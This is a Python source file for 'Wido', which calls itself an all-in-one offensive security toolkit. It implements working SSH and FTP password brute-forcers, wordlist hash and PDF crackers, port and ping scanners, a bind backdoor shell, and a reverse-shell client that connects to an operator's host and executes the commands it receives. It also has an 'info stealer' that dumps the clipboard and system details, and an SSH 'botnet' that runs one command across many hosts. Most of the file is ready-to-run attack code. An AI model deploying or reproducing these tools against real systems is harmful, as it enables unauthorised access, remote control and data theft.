import argparse
import sys
import socket
from concurrent.futures import ThreadPoolExecutor
import hashlib
import ftplib
import threading
import subprocess
import os
from PyPDF2 import PdfReader, PdfWriter
import ipaddress
import platform
try:
    import paramiko
except ImportError:
    paramiko = None
try:
    from scanner import VulnerabilityScanner, SubdomainFinder, check_alive_subdomains
except ImportError:
    VulnerabilityScanner = None
    SubdomainFinder = None
    check_alive_subdomains = None
try:
    import PyPDF2
except ImportError:
    PyPDF2 = None

# Placeholder imports for each module (to be implemented)
# from port_scanner import port_scan
# from hash_cracker import hash_crack
# from advanced_ssh_brute import ssh_brute
# from advance_ftp_brute import ftp_brute
# from backdoor_shell import backdoor_server, backdoor_client
# from info_stealer import info_stealer
# from ssh_botnet import ssh_botnet

def port_scan(args):
    def parse_ports(ports_str):
        ports = set()
        for part in ports_str.split(','):
            if '-' in part:
                start, end = part.split('-')
                ports.update(range(int(start), int(end)+1))
            else:
                ports.add(int(part))
        return sorted(ports)

    target = args.target
    ports = parse_ports(args.ports)
    open_ports = []
    print(f"[Port Scanner] Scanning {target} on ports: {args.ports}")

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((target, port))
                if result == 0:
                    return port
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=100) as executor:
        for result in executor.map(scan_port, ports):
            if result:
                print(f"[OPEN] Port {result}")
                open_ports.append(result)

    if not open_ports:
        print("No open ports found.")
    else:
        print(f"\nOpen ports on {target}: {', '.join(map(str, open_ports))}")

def hash_crack(args):
    def detect_hash_type(hash_str):
        if len(hash_str) == 32:
            return 'md5'
        elif len(hash_str) == 40:
            return 'sha1'
        elif len(hash_str) == 64:
            return 'sha256'
        else:
            return None

    with open(args.hashes, 'r') as f:
        hashes = [line.strip() for line in f if line.strip()]
    with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        words = [line.strip() for line in f if line.strip()]

    cracked = {}
    print(f"[Hash Cracker] Loaded {len(hashes)} hashes and {len(words)} words.")

    for h in hashes:
        hash_type = detect_hash_type(h)
        if not hash_type:
            print(f"[!] Unknown hash type for: {h}")
            continue
        found = False
        for word in words:
            if hash_type == 'md5':
                digest = hashlib.md5(word.encode()).hexdigest()
            elif hash_type == 'sha1':
                digest = hashlib.sha1(word.encode()).hexdigest()
            elif hash_type == 'sha256':
                digest = hashlib.sha256(word.encode()).hexdigest()
            else:
                continue
            if digest == h:
                print(f"[CRACKED] {h} : {word}")
                cracked[h] = word
                found = True
                break
        if not found:
            print(f"[FAILED] {h} : Not found in wordlist")
    print(f"\nTotal cracked: {len(cracked)}/{len(hashes)}")

def ssh_brute(args):
    if paramiko is None:
        print("[!] paramiko module not installed. Please install it with 'pip install paramiko'.")
        return
    host = args.host
    user = args.user
    wordlist = args.wordlist
    print(f"[SSH Brute] Target: {host}, User: {user}, Wordlist: {wordlist}")
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]
    found = False
    for password in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=user, password=password, timeout=3, allow_agent=False, look_for_keys=False)
            print(f"[SUCCESS] {user}@{host} : {password}")
            found = True
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"[FAILED] {user}@{host} : {password}")
        except Exception as e:
            print(f"[ERROR] {user}@{host} : {password} ({e})")
    if not found:
        print("No valid credentials found.")

def ftp_brute(args):
    host = args.host
    user = args.user
    wordlist = args.wordlist
    print(f"[FTP Brute] Target: {host}, User: {user}, Wordlist: {wordlist}")
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]
    found = False
    for password in passwords:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, 21, timeout=3)
            ftp.login(user, password)
            print(f"[SUCCESS] {user}@{host} : {password}")
            found = True
            ftp.quit()
            break
        except ftplib.error_perm:
            print(f"[FAILED] {user}@{host} : {password}")
        except Exception as e:
            print(f"[ERROR] {user}@{host} : {password} ({e})")
    if not found:
        print("No valid credentials found.")

def backdoor_server(args):
    host = '0.0.0.0'
    port = args.port
    print(f"[Backdoor Server] Listening on {host}:{port}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        while True:
            conn.send(b'CMD> ')
            cmd = b''
            while not cmd.endswith(b'\n'):
                chunk = conn.recv(1024)
                if not chunk:
                    break
                cmd += chunk
            if not cmd:
                break
            command = cmd.decode().strip()
            if command.lower() in ('exit', 'quit'):
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            if not output:
                output = b'\n'
            conn.sendall(output)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        conn.close()
        server.close()
        print("[Backdoor Server] Connection closed.")

def backdoor_client(args):
    host = args.host
    port = args.port
    print(f"[Backdoor Client] Connecting to {host}:{port}")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((host, port))
        while True:
            prompt = b''
            while not prompt.endswith(b'CMD> '):
                prompt += client.recv(1)
            cmd = input(prompt.decode())
            client.sendall((cmd + '\n').encode())
            if cmd.lower() in ('exit', 'quit'):
                break
            data = b''
            client.settimeout(1)
            try:
                while True:
                    chunk = client.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
            print(data.decode(errors='ignore'), end='')
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client.close()
        print("[Backdoor Client] Connection closed.")

def info_stealer(args):
    print("[Info Stealer] Collecting information...")
    # Clipboard
    try:
        import pyperclip
        clipboard = pyperclip.paste()
        print(f"\n[Clipboard]\n{clipboard}")
    except ImportError:
        print("[Clipboard] pyperclip not installed. Clipboard content not available.")
    except Exception as e:
        print(f"[Clipboard] Error: {e}")
    # System and network info
    import platform, socket
    try:
        import psutil
        print(f"\n[System Info]")
        print(f"OS: {platform.system()} {platform.release()} ({platform.version()})")
        print(f"Hostname: {socket.gethostname()}")
        print(f"IP: {socket.gethostbyname(socket.gethostname())}")
        print(f"CPU: {platform.processor()}")
        print(f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB")
        print(f"Users: {psutil.users()}")
        print(f"Network Interfaces: {psutil.net_if_addrs()}")
    except ImportError:
        print("[System Info] psutil not installed. Limited info shown.")
        print(f"OS: {platform.system()} {platform.release()} ({platform.version()})")
        print(f"Hostname: {socket.gethostname()}")
        print(f"IP: {socket.gethostbyname(socket.gethostname())}")
        print(f"CPU: {platform.processor()}")
    except Exception as e:
        print(f"[System Info] Error: {e}")
    # Chrome passwords (Windows only, placeholder)
    print("\n[Chrome Passwords]")
    print("[!] Chrome password stealing requires additional code and libraries (pycryptodome, win32crypt) and is only supported on Windows. Not implemented in this demo.")

def ssh_botnet(args):
    if paramiko is None:
        print("[!] paramiko module not installed. Please install it with 'pip install paramiko'.")
        return
    import getpass
    hosts_file = args.hosts
    command = args.command
    user = input("SSH username for all hosts: ")
    password = getpass.getpass("SSH password for all hosts: ")
    with open(hosts_file, 'r') as f:
        hosts = [line.strip() for line in f if line.strip()]
    print(f"[SSH Botnet] Executing '{command}' on {len(hosts)} hosts...")
    for host in hosts:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=user, password=password, timeout=5, allow_agent=False, look_for_keys=False)
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode(errors='ignore')
            error = stderr.read().decode(errors='ignore')
            print(f"\n[{host}] OUTPUT:\n{output}")
            if error:
                print(f"[{host}] ERROR:\n{error}")
            ssh.close()
        except Exception as e:
            print(f"[{host}] [ERROR] {e}")

def vuln_scan(args):
    if VulnerabilityScanner is None:
        print("[!] Vulnerability scanning not available. scanner.py not found or import failed.")
        return
    scanner = VulnerabilityScanner(
        path=args.path,
        output=None,
        severity='low',
        exclude=[],
        max_workers=4
    )
    scanner.scan()
    scanner.generate_report()

def subdomain(args):
    if SubdomainFinder is None:
        print("[!] Subdomain enumeration not available. scanner.py not found or import failed.")
        return
    finder = SubdomainFinder(args.domain)
    finder.find_subdomains()

def alive_subdomains(args):
    if check_alive_subdomains is None:
        print("[!] Alive subdomain check not available. scanner.py not found or import failed.")
        return
    check_alive_subdomains(args.input, args.output, 10)

def pdf_protect(args):
    input_pdf = args.input
    output_pdf = args.output
    password = args.password
    try:
        reader = PdfReader(input_pdf)
        writer = PdfWriter()
        for page in reader.pages:
            writer.add_page(page)
        writer.encrypt(password)
        with open(output_pdf, 'wb') as f:
            writer.write(f)
        print(f"[PDF Protection] PDF saved as {output_pdf} with password protection.")
    except Exception as e:
        print(f"[!] Error protecting PDF: {e}")

def pdf_crack(args):
    input_pdf = args.input
    wordlist = args.wordlist
    try:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        for password in passwords:
            try:
                reader = PdfReader(input_pdf)
                if reader.is_encrypted:
                    if reader.decrypt(password):
                        print(f"[CRACKED] Password found: {password}")
                        return
            except Exception:
                continue
        print("[FAILED] Password not found in wordlist.")
    except Exception as e:
        print(f"[!] Error cracking PDF: {e}")

def network_scan(args):
    subnet = args.subnet
    print(f"[Network Scanner] Scanning subnet: {subnet}")
    live_hosts = []
    for ip in ipaddress.IPv4Network(subnet, strict=False):
        ip_str = str(ip)
        if platform.system().lower() == 'windows':
            response = os.system(f"ping -n 1 -w 500 {ip_str} >nul 2>&1")
        else:
            response = os.system(f"ping -c 1 -W 1 {ip_str} >/dev/null 2>&1")
        if response == 0:
            print(f"[LIVE] {ip_str}")
            live_hosts.append(ip_str)
    print(f"\nTotal live hosts: {len(live_hosts)}")

def backdoor_reverse_server(args):
    import socket
    host = '0.0.0.0'
    port = args.port
    print(f"[Reverse Shell Server] Listening on {host}:{port}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        while True:
            cmd = input("RSHELL> ")
            if not cmd.strip():
                continue
            conn.sendall((cmd + '\n').encode())
            if cmd.lower() in ('exit', 'quit'):
                break
            data = b''
            conn.settimeout(2)
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
            print(data.decode(errors='ignore'), end='')
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        conn.close()
        server.close()
        print("[Reverse Shell Server] Connection closed.")

def backdoor_reverse_client(args):
    import socket
    import subprocess
    host = args.host
    port = args.port
    print(f"[Reverse Shell Client] Connecting to {host}:{port}")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((host, port))
        while True:
            cmd = b''
            while not cmd.endswith(b'\n'):
                chunk = client.recv(1024)
                if not chunk:
                    break
                cmd += chunk
            if not cmd:
                break
            command = cmd.decode().strip()
            if command.lower() in ('exit', 'quit'):
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            if not output:
                output = b'\n'
            client.sendall(output)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client.close()
        print("[Reverse Shell Client] Connection closed.")

def main():
    parser = argparse.ArgumentParser(
        prog='wido',
        description='Wido: All-in-one Offensive Security Toolkit',
        formatter_class=argparse.RawTextHelpFormatter
    )
    subparsers = parser.add_subparsers(title='Modules', dest='module', required=True)

    # Port Scanner
    ps = subparsers.add_parser('port-scan', help='Scan open ports on a target')
    ps.add_argument('--target', required=True, help='Target IP or hostname')
    ps.add_argument('--ports', default='1-1024', help='Port range (e.g., 1-1024 or 80,443,8080)')
    ps.set_defaults(func=port_scan)

    # Hash Cracker
    hc = subparsers.add_parser('hash-crack', help='Crack password hashes using a wordlist')
    hc.add_argument('--hashes', required=True, help='File with hashes (one per line)')
    hc.add_argument('--wordlist', required=True, help='Wordlist file')
    hc.set_defaults(func=hash_crack)

    # SSH Brute
    sshb = subparsers.add_parser('ssh-brute', help='Brute-force SSH logins')
    sshb.add_argument('--host', required=True, help='Target host')
    sshb.add_argument('--user', required=True, help='Username')
    sshb.add_argument('--wordlist', required=True, help='Password wordlist')
    sshb.set_defaults(func=ssh_brute)

    # FTP Brute
    ftpb = subparsers.add_parser('ftp-brute', help='Brute-force FTP logins')
    ftpb.add_argument('--host', required=True, help='Target host')
    ftpb.add_argument('--user', required=True, help='Username')
    ftpb.add_argument('--wordlist', required=True, help='Password wordlist')
    ftpb.set_defaults(func=ftp_brute)

    # Backdoor Server
    bds = subparsers.add_parser('backdoor-server', help='Start a backdoor shell server')
    bds.add_argument('--port', type=int, required=True, help='Port to listen on')
    bds.set_defaults(func=backdoor_server)

    # Backdoor Client
    bdc = subparsers.add_parser('backdoor-client', help='Connect to a backdoor shell server')
    bdc.add_argument('--host', required=True, help='Server host')
    bdc.add_argument('--port', type=int, required=True, help='Server port')
    bdc.set_defaults(func=backdoor_client)

    # Info Stealer
    isf = subparsers.add_parser('info-stealer', help='Steal Chrome passwords, clipboard, and system info')
    isf.set_defaults(func=info_stealer)

    # SSH Botnet
    sbn = subparsers.add_parser('ssh-botnet', help='Remotely manage SSH-connected machines')
    sbn.add_argument('--hosts', required=True, help='File with list of hosts')
    sbn.add_argument('--command', required=True, help='Command to execute')
    sbn.set_defaults(func=ssh_botnet)

    # Vulnerability Scanner
    vs = subparsers.add_parser('vuln-scan', help='Scan code for vulnerabilities')
    vs.add_argument('--path', required=True, help='Path to codebase')
    vs.set_defaults(func=vuln_scan)

    # Subdomain Finder
    sdf = subparsers.add_parser('subdomain', help='Enumerate subdomains for a domain')
    sdf.add_argument('--domain', required=True, help='Target domain')
    sdf.set_defaults(func=subdomain)

    # Alive Subdomains
    als = subparsers.add_parser('alive-subdomains', help='Check which subdomains from file are alive')
    als.add_argument('--input', required=True, help='File with subdomains (one per line)')
    als.add_argument('--output', help='File to save alive subdomains')
    als.set_defaults(func=alive_subdomains)

    # PDF Protection
    pdfp = subparsers.add_parser('pdf-protect', help='Add password protection to a PDF')
    pdfp.add_argument('--input', required=True, help='Input PDF file')
    pdfp.add_argument('--output', required=True, help='Output PDF file')
    pdfp.add_argument('--password', required=True, help='Password to set')
    pdfp.set_defaults(func=pdf_protect)

    # PDF Cracker
    pdfc = subparsers.add_parser('pdf-crack', help='Crack password of a protected PDF using a wordlist')
    pdfc.add_argument('--input', required=True, help='Input (protected) PDF file')
    pdfc.add_argument('--wordlist', required=True, help='Wordlist file')
    pdfc.set_defaults(func=pdf_crack)

    # Network Scanner
    nets = subparsers.add_parser('network-scan', help='Scan a subnet for live hosts (ping sweep)')
    nets.add_argument('--subnet', required=True, help='Subnet to scan (e.g., 192.168.1.0/24)')
    nets.set_defaults(func=network_scan)

    # Reverse Shell Server
    brss = subparsers.add_parser('backdoor-reverse-server', help='Start a reverse shell server (waits for incoming connection)')
    brss.add_argument('--port', type=int, required=True, help='Port to listen on')
    brss.set_defaults(func=backdoor_reverse_server)

    # Reverse Shell Client
    brsc = subparsers.add_parser('backdoor-reverse-client', help='Connect back to a reverse shell server')
    brsc.add_argument('--host', required=True, help='Server host')
    brsc.add_argument('--port', type=int, required=True, help='Server port')
    brsc.set_defaults(func=backdoor_reverse_client)

    # Parse and dispatch
    args = parser.parse_args()
    try:
        args.func(args)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 